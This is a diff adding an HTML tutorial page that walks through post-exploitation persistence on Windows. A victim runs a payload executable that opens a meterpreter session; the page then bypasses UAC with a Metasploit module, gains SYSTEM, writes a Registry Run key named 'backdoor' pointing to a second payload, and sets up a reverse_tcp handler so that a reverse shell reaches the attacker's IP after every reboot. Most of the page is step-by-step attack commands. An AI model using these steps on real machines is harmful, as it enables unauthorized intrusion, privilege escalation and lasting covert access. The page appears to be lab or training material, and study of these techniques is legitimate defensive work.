@@ -1,0 +1,54 @@
+ <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h1>Maintain Persistence by Modifying Registry Run Keys</h1>
+<p>Registry keys labeled as <b>Run</b> and <b>RunOnce</b> are crafted to automatically run programs upon each user login to the system. The command line specified 
+  as a key's data value is restricted to 260 characters or fewer. If attackers discover a service connected to a registry key with full permissions, 
+  they can execute persistence attacks or exploit privilege escalation. Upon any authorized user's login attempt, the associated service link within the 
+  registry triggers automatically.</p>
+
+  <h2>Remote Shell Workflow</h2>
+<p>Follow the <a href=remote_shell_workflow1.html><b>remote shell workflow</b></a> to create an exploit and store it in /var/www/html/share</p>
+<p>Create two exe files for exploits, one exploit for port 444 and named Test.exe and one exploit for port 4444 named registry.exe</p>
+<p>As soon as the victim downloads and opens the Test.exe exploit, a meterpreter session will open</p>
+<p><ol>
+  <ul>sysinfo</ul>
+  <ul>getuid</ul>
+  <ul>background</ul>
+</ol>
+<p>Note: to return to the active session when it is running in background is:</p>
+<p><ol>
+ <ul>sessions -i* -> show active background sessions</ul>
+ <ul>sessions -i 1 -> return to the first background session</ul>
+</ol>
+<p>The meterpreter session is running on the background. Now, type <b>search bypassuac</b> to get the list of bypassuac modules. 
+   use exploit/windows/local/bypassuac_silentcleanup</p>
+<p><ol>
+  <ul>use exploit/windows/local/bypassuac_silentcleanup</ul>
+  <ul>set session 1</ul>
+  <ul>show options</ul>
+ <ul>set lhost 10.10.1.13</ul>
+ <ul>set target 0</ul>
+ <ul>exploit</ul>
+</ol></p>
+<p>The exploit will bypass the UAC setting on the Windows machine.</p>
+<p><ol>
+  <ul>getsystem -t 1</ul>
+  <ul>getuid -> the meterpreter session is now running with system privileges</ul>
+  <ul>shell</ul>
+</ol></p>
+<p>The procedure above will NOT always work, depending of the fact if the OS on the target system is vulnerable or not. Some versions of Windows with some versions 
+of patches and service packs are simply NOT vulnerable and the procedure will fail. If the elevation process fails, try if you can use SHELL etc. anyway.</p>
+<p>In the elevated shell, type <b>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"</b> 
+  and press Enter. Once the command is successfully executed, open another terminal window with root privileges and run <b>msfconsole</b> command.</p>
+<p><ol>
+  <ul>use exploit/multi/handler</ul>
+  <ul>set payload windows/meterpreter/reverse_tcp</ul>
+  <ul>set lhost 10.10.1.13</ul>
+  <ul>set lport 4444</ul>
+  <ul>exploit</ul>
+</ol></p>
+
+<p>Restart the Windows machine so that the malicious file that is placed in the Run Registry is executed.</p>
+<p>It takes some time for the Meterpreter session to open after the start of the Windows machine.
+Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator.</p>
